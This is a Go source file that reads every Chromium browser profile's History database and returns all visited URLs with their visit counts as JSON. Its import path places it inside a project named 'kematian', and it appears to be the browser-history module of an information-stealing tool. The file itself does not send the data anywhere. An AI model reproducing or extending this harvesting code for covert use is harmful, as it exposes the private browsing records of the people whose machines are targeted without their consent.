package history

import (
	"database/sql"
	"encoding/json"
	"kdot/kematian/browsers/chromium/structs"
)

type History struct {
	Url         string `json:"url"`
	Visit_count string `json:"visit_count"`
}

func Get(browsersList []structs.Browser) string {
	var history []History
	for _, browser := range browsersList {
		for _, profile := range browser.Profiles {
			path := profile.History
			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT url, visit_count FROM urls")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var url string
				var visit_count string
				row.Scan(&url, &visit_count)
				history = append(history, History{url, visit_count})
			}
		}
	}
	jsonData, err := json.MarshalIndent(history, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
